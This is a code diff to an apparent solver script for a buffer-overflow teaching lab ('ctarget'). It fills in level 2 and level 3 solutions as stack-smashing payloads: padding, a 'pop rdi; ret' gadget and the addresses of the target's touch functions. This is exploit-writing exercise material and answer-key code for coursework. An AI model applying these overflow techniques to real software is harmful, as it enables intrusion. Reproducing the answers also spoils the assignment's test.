@@ -4,8 +4,11 @@ from typing import Callable
 import click
 from pwn import process, p64
 
+from Crypto.Util.number import long_to_bytes
+
 DIRECTORY = './answers/'
 BUF_SIZE = 56
+COOKIE = int(open('cookie.txt', 'r').read(), 16)
 
 def check_level(level: int) -> bool: return level in [1, 2, 3, 4, 5]
 
@@ -52,13 +55,21 @@ def solve_level_2(flag: bool) -> None:
     solution = (
         b"a" * BUF_SIZE # padding
         + p64(0x4028f0) # pop rdi; ret
-        + p64(0x11560ebd) # cookie value
+        + p64(COOKIE) # cookie value
         + p64(0x401828) # touch 2
     )
     solve_ctarget(solution, flag, 2)
 
 def solve_level_3(flag: bool) -> None:
-    pass
+    payload = long_to_bytes(COOKIE).hex().encode() + b'\x00'
+    solution = (
+        payload
+        + b"a" * (BUF_SIZE - len(payload)) # padding
+        + p64(0x4028f0) # pop rdi; ret
+        + p64(0x5561e608) # cookie hex value address
+        + p64(0x4018fc) # touch 3
+    )
+    solve_ctarget(solution, flag, 3)
 
 def solve_level_4(flag: bool) -> None:
     pass
